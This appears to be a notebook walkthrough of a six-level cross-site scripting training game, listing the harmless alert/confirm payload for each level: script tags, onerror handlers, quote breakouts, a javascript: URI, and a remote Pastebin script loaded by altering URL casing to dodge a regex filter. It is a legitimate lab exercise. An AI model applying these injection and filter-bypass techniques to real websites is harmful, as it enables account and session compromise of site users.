# %% [markdown]
# # **XSS Google Game :**
#
#  * **Level 1 :**
#
#      * **Payload** Injected in Search Field :
#
#          ```text
#           <script>confirm("OK")</Script>
#          ```
#
#  * **Level 2 :**
#
#      * **Payloads** Injected in Comments :
#
#          ```text
#          <img src="X" onerror="alert(1)">
#
#          <script>confirm("OK")</script>
#          ```
#
#  * **Level 3 :**
#
#      * **Payload** Injected Directly into The URL
#
#          ```text
#          X' onerror="alert(1)"
#          ```
#
#  * **Level 4 :**
#
#      * **Payload** Injected into Timer Field
#
#          ```text
#          X');alert(1)('
#          ```
#
#          * or Encode the Payload (URL encoding) and inject it into URl Directly
#
#  * **Level 5 :**
#
#      * XSS on **Next>>**
#
#      * On URL Field Change **confirm** into The Your Payload
#
#          ```text
#          javascript: onclick=alert(1)
#          ```
#
#
#  * **Level 6 :**
#
#      * We Need to Load a JS File From External Source
#
#      * Create a Link from **Pastebin** Website https://pastebin.com/ , and Create a File Its Content is Your Payload **alert(1);**
#
#      * Take this Link and Change https to HTTPS or Remove it to Bypass Regex Filtration and Inject it Into URL Field
